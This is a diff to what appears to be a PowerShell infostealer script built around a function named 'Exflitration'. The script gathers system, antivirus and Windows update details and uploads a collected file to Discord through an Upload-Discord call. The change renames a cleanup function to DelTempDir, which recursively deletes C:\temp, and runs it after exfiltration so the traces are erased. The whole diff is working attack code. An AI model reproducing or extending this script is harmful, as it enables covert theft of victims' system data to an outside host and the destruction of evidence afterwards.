@@ -52,8 +52,6 @@ function Exflitration {
     # Call SysInfo function
     SysInfo
 
-    # Call the Del-Nirsoft-File function
-    Del-Nirsoft-File
 }
 
     function version-av {
@@ -123,7 +121,7 @@ function Exflitration {
         Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
     }
 
-    function Del-Nirsoft-File {
+    function DelTempDir {
         cd C:\
         rmdir -R \temp
         exit
@@ -132,3 +130,4 @@ function Exflitration {
 TempDir
 #Call Exflitration
 Exflitration
+DelTempDir
